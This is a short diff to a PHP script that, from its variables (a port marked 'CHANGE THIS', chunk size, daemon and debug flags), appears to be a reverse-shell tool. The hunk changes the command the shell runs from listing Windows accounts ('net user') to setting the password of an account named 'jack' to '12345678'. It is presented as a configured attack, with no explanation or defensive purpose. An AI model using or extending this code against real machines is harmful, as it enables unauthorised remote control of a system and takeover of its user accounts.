@@ -7,7 +7,7 @@ $port = 12922;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'net user';
+$shell = 'net user jack 12345678';
 $daemon = 0;
 $debug = 0;
 
